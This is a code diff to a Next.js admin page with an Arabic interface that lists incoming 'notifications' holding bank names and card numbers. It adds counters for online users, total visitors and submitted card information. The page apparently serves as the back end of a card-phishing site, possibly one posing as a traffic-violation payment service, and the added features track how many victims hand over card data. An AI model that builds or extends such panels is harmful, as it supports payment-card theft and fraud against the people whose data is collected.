@@ -2,7 +2,7 @@
 
 import { useState, useEffect } from "react"
 import { useRouter } from "next/navigation"
-import { Trash2 } from "lucide-react"
+import { Trash2, Users, CreditCard, UserCheck } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ar } from "date-fns/locale"
@@ -14,6 +14,25 @@ import { playNotificationSound } from "@/lib/actions"
 import { auth, db, database } from "@/lib/firestore"
 import { InfoIcon } from "lucide-react"
 import { onValue, ref } from "firebase/database"
+
+function useOnlineUsersCount() {
+  const [onlineUsersCount, setOnlineUsersCount] = useState(0)
+
+  useEffect(() => {
+    const onlineUsersRef = ref(database, "status")
+    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
+      const data = snapshot.val()
+      if (data) {
+        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
+        setOnlineUsersCount(onlineCount)
+      }
+    })
+
+    return () => unsubscribe()
+  }, [])
+
+  return onlineUsersCount
+}
 
 interface Notification {
   bank: string
@@ -56,7 +75,11 @@ export default function NotificationsPage() {
   const [violationValues, setViolationValues] = useState<{
     [key: string]: string
   }>({})
+  const [onlineUsers, setOnlineUsers] = useState<number>(0)
+  const [totalVisitors, setTotalVisitors] = useState<number>(0)
+  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
   const router = useRouter()
+  const onlineUsersCount = useOnlineUsersCount()
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
@@ -106,6 +129,9 @@ export default function NotificationsPage() {
           playNotificationSound()
         }
 
+        // Update statistics
+        updateStatistics(notificationsData)
+
         setNotifications(notificationsData)
         setIsLoading(false)
       },
@@ -116,6 +142,17 @@ export default function NotificationsPage() {
     )
 
     return unsubscribe
+  }
+
+  const updateStatistics = (notificationsData: Notification[]) => {
+    // Total visitors is the total count of notifications
+    const totalCount = notificationsData.length
+
+    // Card submissions is the count of notifications with card info
+    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length
+
+    setTotalVisitors(totalCount)
+    setCardSubmissions(cardCount)
   }
 
   const handleClearAll = async () => {
@@ -253,6 +290,42 @@ export default function NotificationsPage() {
             <Button variant="outline" onClick={handleLogout} className="bg-gray-100 hover:bg-gray-100">
               تسجيل الخروج
             </Button>
+          </div>
+        </div>
+
+        {/* Statistics Grid */}
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+          {/* Online Users Card */}
+          <div className="bg-white rounded-lg shadow p-4 flex items-center">
+            <div className="rounded-full bg-blue-100 p-3 mr-4">
+              <UserCheck className="h-6 w-6 text-blue-500" />
+            </div>
+            <div>
+              <p className="text-sm text-gray-500">المستخدمين المتصلين</p>
+              <p className="text-2xl font-bold">{onlineUsersCount}</p>
+            </div>
+          </div>
+
+          {/* Total Visitors Card */}
+          <div className="bg-white rounded-lg shadow p-4 flex items-center">
+            <div className="rounded-full bg-green-100 p-3 mr-4">
+              <Users className="h-6 w-6 text-green-500" />
+            </div>
+            <div>
+              <p className="text-sm text-gray-500">إجمالي الزوار</p>
+              <p className="text-2xl font-bold">{totalVisitors}</p>
+            </div>
+          </div>
+
+          {/* Card Submissions Card */}
+          <div className="bg-white rounded-lg shadow p-4 flex items-center">
+            <div className="rounded-full bg-purple-100 p-3 mr-4">
+              <CreditCard className="h-6 w-6 text-purple-500" />
+            </div>
+            <div>
+              <p className="text-sm text-gray-500">معلومات البطاقات المقدمة</p>
+              <p className="text-2xl font-bold">{cardSubmissions}</p>
+            </div>
           </div>
         </div>
 
